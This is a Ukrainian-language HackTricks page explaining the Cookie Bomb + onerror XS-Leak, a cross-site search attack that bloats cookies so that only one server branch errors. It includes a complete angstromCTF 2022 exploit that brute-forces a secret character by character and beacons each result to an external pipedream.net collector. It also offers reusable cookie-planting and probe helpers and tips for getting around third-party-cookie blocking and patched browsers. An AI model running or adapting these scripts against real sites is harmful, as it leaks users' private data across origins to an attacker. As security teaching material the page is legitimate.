# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

Ця техніка поєднує:
- Cookie bombing: наповнення браузера жертви великою кількістю/великими cookie для цільового origin так, щоб наступні запити влучали в обмеження сервера/запиту (розмір заголовків запиту, розмір URL у редиректах тощо).
- Error-event oracle: пробування cross-origin endpoint за допомогою `<script>` (або іншого subresource) та розрізнення станів за допомогою `onload` vs `onerror`.

Загальна ідея
- Знайдіть цільовий endpoint, поведінка якого відрізняється для двох станів, які ви хочете перевірити (наприклад, пошук “hit” vs “miss”).
- Переконайтеся, що шлях “hit” спричинить велику ланцюжок редиректів або довгий URL, тоді як шлях “miss” залишатиметься коротким. Збільшіть розмір заголовків запиту за допомогою великої кількості cookie так, щоб тільки шлях “hit” змусив сервер зламатися з HTTP-помилкою (наприклад, 431/414/400). Помилка перемикає подію в onerror і стає оракулом для XS-Search.

Коли це працює
- Ви можете змусити браузер жертви відправляти cookie на ціль (наприклад, cookie мають SameSite=None або ви можете встановити їх у first-party контексті через popup `window.open`).
- Існує функція додатку, яку можна зловживати для встановлення довільних cookie (наприклад, “save preference” endpoints, що перетворюють контрольовані імена/значення інпутів у Set-Cookie) або для створення post-auth редиректів, які включають дані, контрольовані атакуючим, у URL.
- Сервер реагує по-різному на ці два стани і, при збільшених заголовках/URL, один із станів перевищує обмеження і повертає помилкову відповідь, яка викликає onerror.

Примітка щодо серверних помилок, що використовуються як оракул
- 431 Request Header Fields Too Large зазвичай повертається, коли cookie збільшують заголовки запиту; 414 URI Too Long або серверно-специфічний 400 можуть повернутися для довгих цілей запиту. Будь-який із цих випадків призводить до невдалого завантаження subresource і викликає onerror. Див. [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) для типових причин, як надмірні cookie.

<details>
<summary>Практичний приклад (angstromCTF 2022)</summary>

The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Навіщо popup (`window.open`)?
- Сучасні браузери все частіше блокують third-party cookies. Відкриття top-level вікна до цілі робить cookies first‑party, тож відповіді Set-Cookie від цілі збережуться, дозволяючи cookie-bomb крок навіть за обмежень third‑party cookies.

2024–2025 нотатки щодо доступності cookie
- Chrome’s Tracking Protection rollout (January 2024) вже блокує third-party cookies для випадкової когорти і планується розширити на всю базу користувачів після схвалення UK CMA, тож припускайте, що будь‑яка жертва може раптово втратити 3P cookies. Автоматизуйте fallback: визначайте, коли ваш script probe не вдається, не дійшовши до цілі, і прозоро переходьте на popup/first-party flow. Safari і Firefox вже за замовчуванням блокують більшість third-party cookies, а CHIPS/partitioned cookies означають, що кожен top-level сайт тепер має власну jar.
- Використовуйте first‑party cookie planting flow (`window.open` + auto-submit до cookie-setting endpoint) і потім пробуйте через subresource, який вдається лише коли ці cookies відправлені. Якщо third‑party cookies заблоковані, перемістіть probe у same-site контекст (наприклад, запустіть the oracle у popup через same-site gadget і ексфільтруйте булеве значення через `postMessage` або beacon на ваш сервер), або зареєструйте victim origin у Chrome’s deprecation trial якщо ви законно контролюєте його.

<details>
<summary>Помічник для first-party planting, безпечний для Tracking-Protection</summary>

Коли потрібно запхати десятки cookie з cross-site context, створіть тимчасове top-level вікно і виконайте серію перевантажених відправлень форм (oversized form submissions) до уразливого Set-Cookie endpoint:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Викличте його безпосередньо перед тим, як почнете probing, щоб кожен запуск oracle починався з щойно наповненого cookie jar.

</details>

Універсальний probing-помічник
Якщо у вас вже є спосіб встановити багато cookies на target origin (first-party), ви можете повторно використовувати цей мінімальний oracle проти будь-якого endpoint, успіх/невдача якого призводить до різних network outcomes (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Альтернативний tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Advanced: de Bruijn–based cookie packing (CTF-proven)
- Коли додаток дозволяє контролювати великі cookie values, ви можете ефективно пакувати guesses, додаючи de Bruijn sequence до кожного probe. Це зберігає невеликий наклад на кожен probe, одночасно гарантуючи, що heavy branch буде послідовно важчою лише для правильного prefix. Приклад генератора для |Σ| символів довжини n (вміщується в cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Ідея на практиці: встановити кілька cookies зі значеннями prefix + deBruijn(k,n). Лише коли перевірений префікс правильний, сервер обирає важкий шлях (наприклад, додатковий redirect, що відображає довгий cookie або URL), який у поєднанні з cookie bloat перевищує ліміти і перемикає onerror. Див. публічний solver LA CTF 2024, що використовує цей підхід.

Поради для побудови oracle
- Зробіть «позитивний» стан важчим: ланцюжте додатковий redirect лише коли предикат істинний, або зробіть redirect URL таким, щоб він відображав необмежений користувацький ввід і зростав разом із вгаданим префіксом.
- Надуття headers: повторюйте cookie bombing, поки на «важкому» шляху не спостерігається стабільна помилка. Сервери зазвичай обмежують розмір headers і зламаються раніше, коли присутньо багато cookies.
- Стабілізація: виконуйте кілька паралельних операцій встановлення cookies і багаторазово опитуйте, щоб усереднити таймінг та шум кешування.
- Ломайте кеші та уникайте артефактів pooling: додавайте випадковий `#fragment` або `?r=` до probe URLs, і віддавайте перевагу унікальним іменам вікон при використанні `window.open` у циклах.
- Чергуйте subresources: якщо `<script>` фільтрується, спробуйте `<link rel=stylesheet>` або `<img>`. Сигнал onload/onerror — це oracle; контент ніколи не потрібно парсити.

Типові обмеження header/URL (корисні пороги)
- Reverse proxies/CDNs та сервери застосовують різні ліміти. Станом на жовтень 2025 Cloudflare документує 128 KB загалом для request headers (і 16 KB для URL) на edge, тож вам може знадобитися більше/більші cookies, коли цілі знаходяться за ним. Інші стеки (наприклад, Apache через LimitRequestFieldSize) зазвичай ближчі до ~8 KB на рядок header і вдарять помилками раніше. Відрегулюйте розмір bomb відповідно (див. [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Список посилення браузерів (2025+)
- Firefox 139/ESR 128.11 (травень 2025) посилив облік load/error у script tag для cross-origin ресурсів (CVE-2025-5266). На пропатчених клієнтах сигнал `onerror` для певних redirected відповідей пригнічується, тому диверсифікуйте oracle (паралельні `<link rel=stylesheet>`, `<img>` або `fetch` з невідповідним MIME) і зробіть fingerprint victim UA перед тим, як припустити, що булевий сигнал все ще спрацьовує.
- Очікуйте, що enterprise Chromium збірки з Tracking Protection або Fetch Metadata політиками періодично обрізатимуть cookies або перезаписуватимуть redirects. Виявляйте такі випадки, спочатку опитавши короткий endpoint; якщо він не пройде, автоматично переключайтесь на запуск усієї атаки всередині popup і передавайте біти через `postMessage`/`BroadcastChannel`.

Related XS-Search tricks
- URL length based oracles (no cookies needed) можна комбінувати або використовувати замість них, коли ви можете примусити дуже довгий request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Примітки
- Цей клас атак широко обговорюється як “Error Events” XS-Leaks. Крок cookie-bomb — це просто зручний спосіб проштовхнути лише одну гілку через серверні ліміти, створюючи надійний boolean oracle.



## Посилання
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- Примітка в writeup LA CTF 2024, що демонструє de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
